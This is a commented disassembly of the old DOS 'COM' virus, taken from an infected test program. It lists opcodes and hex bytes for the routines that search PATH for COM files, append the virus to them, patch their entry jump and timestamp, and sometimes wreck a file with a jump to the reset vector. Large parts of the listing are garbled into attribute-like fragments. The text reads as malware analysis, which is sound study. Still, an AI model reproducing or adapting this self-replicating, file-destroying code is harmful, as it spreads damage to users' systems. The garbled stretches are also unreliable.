﻿

This is a thoroughly commented listing of the well-known 'COM'-
virus. The virus is highly contagious and infects all COM files it
can find along the defined search PATH. Each time an infected COM
program is run, another one will be infected. If the seconds value of
the current system time equals 0 modulo 7, the file is not infected
but ruined by writing a jump to the reset vector into its beginning.
Different from 'normally' infected ones, files so modified cannot be
recovered properly. The first 5 bytes are gone forever.

This listing was obtained by letting the virus loose on a few copies
of a small program written for the purpose. This was done in a
carefully controlled environment on a RAM-disk with the search path
set to the root directory of the RAM drive. The original program
called BEEP.COM looked like this:

_TEXT           SEGMENT BYTE 'CODE'
MAIN            PROC    FAR
                MOV     AH,2
                MOV     DL,7
                INT     21H
                MOV     AX,4C00H
                INT     21H
                MAIN    ENDP
                _TEXT ENDS
                END

And the following listing shows how this very program looked AFTER
the infection. All numbers are hex values.

[CS]:0100 E90800        JMP     010B            ; jump to start of virus code

[CS]:0103               DB      07              ; 4th byte of host program
[CS]:0104 CD21          INT     21
[CS]:0106 B8004C        MOV     AX,4C00
[CS]:0109 CD21          INT     21              ; terminate

[CS]:010B 51            PUSH    CX
[CS]:010C BA0403        MOV     DX,0304         ; load data area base address
[CS]:010F FC            CLD
[CS]:0110 8BF2          MOV     SI,DX
[CS]:0112 81C60A00      ADD     SI,000A         ; SI <- offset="" of="" saved="" bytes="" [cs]:0116="" bf0001="" mov="" di,0100="" ;="" di=""></-><- start="" of="" program="" [cs]:0119="" b90300="" mov="" cx,0003="" ;="" 3="" bytes="" to="" replace="" [cs]:011c="" f3="" repz="" [cs]:011d="" a4="" movsb="" ;="" restore="" original="" program="" [cs]:011e="" 8bf2="" mov="" si,dx="" ;="" si=""></-><- data="" area="" base="" address="" [cs]:0120="" b430="" mov="" ah,30="" [cs]:0122="" cd21="" int="" 21="" ;="" get="" dos="" version="" #="" [cs]:0124="" 3c00="" cmp="" al,00="" ;="" lower="" than="" 2.00="" [cs]:0126="" 7503="" jnz="" 012b="" ;="" no,="" continue="" [cs]:0128="" e9c701="" jmp="" 02f2="" ;="" go="" start="" host="" program="" [cs]:012b="" 06="" push="" es="" [cs]:012c="" b42f="" mov="" ah,2f="" [cs]:012e="" cd21="" int="" 21="" ;="" fetch="" dta="" address="" to="" es:bx="" [cs]:0130="" 899c0000="" mov="" [si+0000],bx="" [cs]:0134="" 8c840200="" mov="" [si+0002],es="" ;="" save="" address="" [cs]:0138="" 07="" pop="" es="" [cs]:0139="" ba5f00="" mov="" dx,005f="" [cs]:013c="" 90="" nop="" [cs]:013d="" 03d6="" add="" dx,si="" ;="" yields="" 0363="" [cs]:013f="" b41a="" mov="" ah,1a="" [cs]:0141="" cd21="" int="" 21="" ;="" set="" new="" dta="" address="" [cs]:0143="" 06="" push="" es="" [cs]:0144="" 56="" push="" si="" [cs]:0145="" 8e062c00="" mov="" es,[002c]="" ;="" load="" environment="" segment="" [cs]:0149="" bf0000="" mov="" di,0000="" [cs]:014c="" 5e="" pop="" si="" [cs]:014d="" 56="" push="" si="" [cs]:014e="" 81c61a00="" add="" si,001a="" ;="" yields="" 031e="" [cs]:0152="" ac="" lodsb="" [cs]:0153="" b90080="" mov="" cx,8000="" ;="" maximum="" environment="" size="" [cs]:0156="" f2="" repnz="" [cs]:0157="" ae="" scasb="" ;="" search="" for="" 'p'="" [cs]:0158="" b90400="" mov="" cx,0004="" ;="" 'ath=' remains
[CS]:015B AC            LODSB                   ; compare byte ...
[CS]:015C AE            SCASB                   ; ... by byte
[CS]:015D 75ED          JNZ     014C            ; not PATH variable, retry
[CS]:015F E2FA          LOOP    015B            ; compare 4 letters
[CS]:0161 5E            POP     SI              ; restore data area base addr
[CS]:0162 07            POP     ES
[CS]:0163 89BC1600      MOV     [SI+0016],DI    ; save base of PATH contents
[CS]:0167 8BFE          MOV     DI,SI           ; purpose of line unknown
[CS]:0169 81C71F00      ADD     DI,001F         ;          - " -
[CS]:016D 8BDE          MOV     BX,SI           ; BX <- data area base address
[CS]:016F 81C61F00      ADD     SI,001F         ; yields 0323
[CS]:0173 8BFE          MOV     DI,SI
[CS]:0175 EB3A          JMP     01B1
[CS]:0177 83BC160000    CMP     WORD PTR [SI+0016],+00 ; end of environment ?
[CS]:017C 7503          JNZ     0181            ; no, continue
[CS]:017E E96301        JMP     02E4            ; yes, terminate virus

[CS]:0181 1E            PUSH    DS
[CS]:0182 56            PUSH    SI
[CS]:0183 26            ES:
[CS]:0184 8E1E2C00      MOV     DS,[002C]       ; load environment segment
[CS]:0188 8BFE          MOV     DI,SI           ; copy data area base address
[CS]:018A 26            ES:
[CS]:018B 8BB51600      MOV     SI,[DI+0016]    ; load pointer into path
[CS]:018F 81C71F00      ADD     DI,001F         ; point DI to file name buffer
[CS]:0193 AC            LODSB                   ; read next path character
[CS]:0194 3C3B          CMP     AL,3B           ; is it a ' ;'="" [cs]:0196="" 740a="" jz="" 01a2="" ;="" yes,="" next="" directory="" [cs]:0198="" 3c00="" cmp="" al,00="" ;="" end="" of="" path="" contents="" [cs]:019a="" 7403="" jz="" 019f="" ;="" yes="" [cs]:019c="" aa="" stosb="" ;="" normal="" character,="" store="" [cs]:019d="" ebf4="" jmp="" 0193="" ;="" copy="" path="" entry="" [cs]:019f="" be0000="" mov="" si,0000="" [cs]:01a2="" 5b="" pop="" bx="" ;="" restore="" data="" area="" base="" [cs]:01a3="" 1f="" pop="" ds="" [cs]:01a4="" 89b71600="" mov="" [bx+0016],si="" ;="" store="" new="" environment="" pointer="" [cs]:01a8="" 807dff5c="" cmp="" byte="" ptr="" [di-01],5c="" [cs]:01ac="" 7403="" jz="" 01b1="" [cs]:01ae="" b05c="" mov="" al,5c="" ;="" add="" '\'="" if="" not="" present="" [cs]:01b0="" aa="" stosb="" [cs]:01b1="" 89bf1800="" mov="" [bx+0018],di="" ;="" save="" pointer="" to="" name="" buffer="" [cs]:01b5="" 8bf3="" mov="" si,bx="" [cs]:01b7="" 81c61000="" add="" si,0010="" ;="" yields="" 0314="" [cs]:01bb="" b90600="" mov="" cx,0006="" [cs]:01be="" f3="" repz="" [cs]:01bf="" a4="" movsb="" ;="" copy="" '*.com',0="" [cs]:01c0="" 8bf3="" mov="" si,bx="" [cs]:01c2="" b44e="" mov="" ah,4e="" [cs]:01c4="" ba1f00="" mov="" dx,001f="" [cs]:01c7="" 90="" nop="" [cs]:01c8="" 03d6="" add="" dx,si="" ;="" point="" dx="" to="" '*.com',0="" [cs]:01ca="" b90300="" mov="" cx,0003="" ;="" include="" hidden="" &="" read-only="" [cs]:01cd="" cd21="" int="" 21="" ;="" find="" first="" matching="" file="" [cs]:01cf="" eb04="" jmp="" 01d5="" [cs]:01d1="" b44f="" mov="" ah,4f="" [cs]:01d3="" cd21="" int="" 21="" ;="" find="" next="" file="" [cs]:01d5="" 7302="" jnb="" 01d9="" ;="" found="" a="" file,="" continue="" [cs]:01d7="" eb9e="" jmp="" 0177="" ;="" else="" go="" find="" next="" directory="" [cs]:01d9="" 8b847500="" mov="" ax,[si+0075]="" ;="" load="" file's="" time="" stamp="" [cs]:01dd="" 241f="" and="" al,1f="" ;="" mask="" bits="" 0="" thru="" 4="" [cs]:01df="" 3c1f="" cmp="" al,1f="" ;="" program="" already="" infected="" [cs]:01e1="" 74ee="" jz="" 01d1="" ;="" yes,="" go="" search="" next="" file="" [cs]:01e3="" 81bc790000fa="" cmp="" word="" ptr="" [si+0079],fa00="" ;="" file="" size=""> FA00H ?
[CS]:01E9 77E6          JA      01D1            ; yes, go search next file
[CS]:01EB 83BC79000A    CMP     WORD PTR [SI+0079],+0A  ; file size < 000ah="" [cs]:01f0="" 72df="" jb="" 01d1="" ;="" yes,="" go="" search="" next="" file="" [cs]:01f2="" 8bbc1800="" mov="" di,[si+0018]="" ;="" restore="" pointer="" to="" buffer="" [cs]:01f6="" 56="" push="" si="" [cs]:01f7="" 81c67d00="" add="" si,007d="" ;="" point="" si="" to="" file="" name="" [cs]:01fb="" ac="" lodsb="" ;="" load="" character="" [cs]:01fc="" aa="" stosb="" ;="" store="" [cs]:01fd="" 3c00="" cmp="" al,00="" ;="" end-of-string="" [cs]:01ff="" 75fa="" jnz="" 01fb="" ;="" no,="" next="" char="" [cs]:0201="" 5e="" pop="" si="" ;="" restore="" data="" area="" base="" addr="" [cs]:0202="" b80043="" mov="" ax,4300="" [cs]:0205="" ba1f00="" mov="" dx,001f="" [cs]:0208="" 90="" nop="" [cs]:0209="" 03d6="" add="" dx,si="" ;="" point="" dx="" to="" file="" name="" [cs]:020b="" cd21="" int="" 21="" ;="" get="" file="" attributes="" [cs]:020d="" 898c0800="" mov="" [si+0008],cx="" ;="" save="" attributes="" [cs]:0211="" b80143="" mov="" ax,4301="" [cs]:0214="" 81e1feff="" and="" cx,fffe="" ;="" remove="" read="" only="" bit="" [cs]:0218="" ba1f00="" mov="" dx,001f="" [cs]:021b="" 90="" nop="" [cs]:021c="" 03d6="" add="" dx,si="" [cs]:021e="" cd21="" int="" 21="" ;="" set="" file="" attributes="" [cs]:0220="" b8023d="" mov="" ax,3d02="" [cs]:0223="" ba1f00="" mov="" dx,001f="" [cs]:0226="" 90="" nop="" [cs]:0227="" 03d6="" add="" dx,si="" [cs]:0229="" cd21="" int="" 21="" ;="" open="" file="" [cs]:022b="" 7303="" jnb="" 0230="" ;="" continue="" if="" no="" error="" [cs]:022d="" e9a500="" jmp="" 02d5="" ;="" else="" terminate="" [cs]:0230="" 8bd8="" mov="" bx,ax="" ;="" copy="" file="" handle="" [cs]:0232="" b80057="" mov="" ax,5700="" [cs]:0235="" cd21="" int="" 21="" ;="" get="" file's="" date="" &="" time="" [cs]:0237="" 898c0400="" mov="" [si+0004],cx="" ;="" save="" date="" &="" time="" stamps="" [cs]:023b="" 89940600="" mov="" [si+0006],dx="" [cs]:023f="" b42c="" mov="" ah,2c="" [cs]:0241="" cd21="" int="" 21="" ;="" get="" system="" time="" [cs]:0243="" 80e607="" and="" dh,07="" ;="" (seconds="" mod="" 7)="=" 0="" [cs]:0246="" 7510="" jnz="" 0258="" ;="" no,="" continue="" [cs]:0248="" b440="" mov="" ah,40="" ;="" yes,="" write="" ...="" [cs]:024a="" b90500="" mov="" cx,0005="" ;="" 5="" bytes="" ...="" [cs]:024d="" 8bd6="" mov="" dx,si="" ;="" containing="" far="" jump="" ...="" [cs]:024f="" 81c28a00="" add="" dx,008a="" ;="" to="" f000:fff0="" [cs]:0253="" cd21="" int="" 21="" [cs]:0255="" eb65="" jmp="" 02bc="" ;="" go="" close="" file="" [cs]:0257="" 90="" nop="" [cs]:0258="" b43f="" mov="" ah,3f="" [cs]:025a="" b90300="" mov="" cx,0003="" ;="" read="" first="" three="" ...="" [cs]:025d="" ba0a00="" mov="" dx,000a="" ;="" bytes="" of="" .com="" file="" ...="" [cs]:0260="" 90="" nop="" ;="" to="" buffer="" ...="" [cs]:0261="" 03d6="" add="" dx,si="" ;="" for="" later="" restoration="" ...="" [cs]:0263="" cd21="" int="" 21="" ;="" of="" the="" host="" program.="" [cs]:0265="" 7255="" jb="" 02bc="" ;="" if="" error="" go="" close="" file="" [cs]:0267="" 3d0300="" cmp="" ax,0003="" ;="" three="" bytes="" read="" [cs]:026a="" 7550="" jnz="" 02bc="" ;="" no,="" close="" file="" [cs]:026c="" b80242="" mov="" ax,4202="" [cs]:026f="" b90000="" mov="" cx,0000="" [cs]:0272="" ba0000="" mov="" dx,0000="" [cs]:0275="" cd21="" int="" 21="" ;="" lseek="" to="" end-of-file="" [cs]:0277="" 7243="" jb="" 02bc="" ;="" if="" error="" go="" close="" file="" [cs]:0279="" 8bc8="" mov="" cx,ax="" ;="" copy="" file="" size="" [cs]:027b="" 2d0300="" sub="" ax,0003="" ;="" calculate="" jmp="" operand="" [cs]:027e="" 89840e00="" mov="" [si+000e],ax="" ;="" save="" value="" [cs]:0282="" 81c1f902="" add="" cx,02f9="" ;="" add="" code="" size="" +="" 100h="" [cs]:0286="" 8bfe="" mov="" di,si="" [cs]:0288="" 81eff701="" sub="" di,01f7="" ;="" point="" di="" to="" base="" addr="" field="" [cs]:028c="" 890d="" mov="" [di],cx="" ;="" modify="" code="" [cs]:028e="" b440="" mov="" ah,40="" [cs]:0290="" b98802="" mov="" cx,0288="" ;="" bytes="" to="" write="" [cs]:0293="" 8bd6="" mov="" dx,si="" [cs]:0295="" 81eaf901="" sub="" dx,01f9="" ;="" dx=""><- start="" of="" virus="" code="" [cs]:0299="" cd21="" int="" 21="" ;="" append="" virus="" to="" file="" [cs]:029b="" 721f="" jb="" 02bc="" ;="" close="" file="" if="" error="" [cs]:029d="" 3d8802="" cmp="" ax,0288="" ;="" all="" bytes="" written="" [cs]:02a0="" 751a="" jnz="" 02bc="" ;="" no,="" go="" close="" file="" [cs]:02a2="" b80042="" mov="" ax,4200="" [cs]:02a5="" b90000="" mov="" cx,0000="" [cs]:02a8="" ba0000="" mov="" dx,0000="" [cs]:02ab="" cd21="" int="" 21="" ;="" lseek="" to="" start="" of="" file="" [cs]:02ad="" 720d="" jb="" 02bc="" ;="" quit="" if="" error="" [cs]:02af="" b440="" mov="" ah,40="" [cs]:02b1="" b90300="" mov="" cx,0003="" ;="" three="" bytes="" to="" write="" [cs]:02b4="" 8bd6="" mov="" dx,si="" [cs]:02b6="" 81c20d00="" add="" dx,000d="" [cs]:02ba="" cd21="" int="" 21="" ;="" write="" near="" jmp="" to="" virus="" code="" [cs]:02bc="" 8b940600="" mov="" dx,[si+0006]="" ;="" load="" saved="" date="" &="" time="" stamps="" [cs]:02c0="" 8b8c0400="" mov="" cx,[si+0004]="" [cs]:02c4="" 81e1e0ff="" and="" cx,ffe0="" ;="" a="" rather="" clumsy="" way="" to="" set="" [cs]:02c8="" 81c91f00="" or="" cx,001f="" ;="" bits="" 0="" thru="" 4="" of="" time="" to="" 1="" [cs]:02cc="" b80157="" mov="" ax,5701="" [cs]:02cf="" cd21="" int="" 21="" ;="" set="" new="" date="" time="" [cs]:02d1="" b43e="" mov="" ah,3e="" [cs]:02d3="" cd21="" int="" 21="" ;="" close="" file="" [cs]:02d5="" b80143="" mov="" ax,4301="" [cs]:02d8="" 8b8c0800="" mov="" cx,[si+0008]="" ;="" load="" saved="" file="" attributes="" [cs]:02dc="" ba1f00="" mov="" dx,001f="" [cs]:02df="" 90="" nop="" [cs]:02e0="" 03d6="" add="" dx,si="" [cs]:02e2="" cd21="" int="" 21="" ;="" set="" file="" attributes="" (chmod)="" [cs]:02e4="" 1e="" push="" ds="" [cs]:02e5="" b41a="" mov="" ah,1a="" [cs]:02e7="" 8b940000="" mov="" dx,[si+0000]="" ;="" load="" old="" dta="" address="" [cs]:02eb="" 8e9c0200="" mov="" ds,[si+0002]="" [cs]:02ef="" cd21="" int="" 21="" ;="" restore="" old="" dta="" [cs]:02f1="" 1f="" pop="" ds="" [cs]:02f2="" 59="" pop="" cx="" [cs]:02f3="" 33c0="" xor="" ax,ax="" ;="" set="" all="" regs="" to="" dos="" defaults="" [cs]:02f5="" 33db="" xor="" bx,bx="" [cs]:02f7="" 33d2="" xor="" dx,dx="" [cs]:02f9="" 33f6="" xor="" si,si="" [cs]:02fb="" bf0001="" mov="" di,0100="" ;="" load="" program="" start="" address="" [cs]:02fe="" 57="" push="" di="" [cs]:02ff="" 33ff="" xor="" di,di="" [cs]:0301="" c2ffff="" ret="" ffff="" ;="" run="" host="" program="" [cs]:0300="" 80="" 00="" 71="" 4c-d9="" 1e="" cb="" 10="" 20="" 00="" b4="" 02="" ..qly.k.="" .4.="" [cs]:0310="" b2="" e9="" 08="" 00="" 2a="" 2e="" 43="" 4f-4d="" 00="" 34="" 00="" 58="" 04="" 50="" 41="" 2i..*.com.4.x.pa="" [cs]:0320="" 54="" 48="" 3d="" 42="" 45="" 45="" 50="" 2e-43="" 4f="" 4d="" 00="" 4d="" 4f="" 52="" 45="" th="BEEP.COM.MORE" [cs]:0330="" 2e="" 43="" 4f="" 4d="" 00="" 4d="" 00="" 20-20="" 20="" 20="" 20="" 20="" 20="" 20="" 20="" .com.m.="" [cs]:0340="" 20="" 20="" 20="" 20="" 20="" 20="" 20="" 20-20="" 20="" 20="" 20="" 20="" 20="" 20="" 20="" [cs]:0350="" 20="" 20="" 20="" 20="" 20="" 20="" 20="" 20-20="" 20="" 20="" 20="" 20="" 20="" 20="" 20="" [cs]:0360="" 20="" 20="" 20="" 04="" 3f="" 3f="" 3f="" 3f-3f="" 3f="" 3f="" 3f="" 43="" 4f="" 4d="" 03="" .????????com.="" [cs]:0370="" 02="" 00="" 00="" 00="" 00="" 00="" 00="" 00-20="" d9="" 1e="" cb="" 10="" 0b="" 00="" 00="" ........="" y.k....="" [cs]:0380="" 00="" 42="" 45="" 45="" 50="" 2e="" 43="" 4f-4d="" 00="" 00="" 00="" 00="" 00="" ea="" f0="" .beep.com.....jp="" [cs]:0390="" ff="" 00="" f0="" ..p="" =""></-></->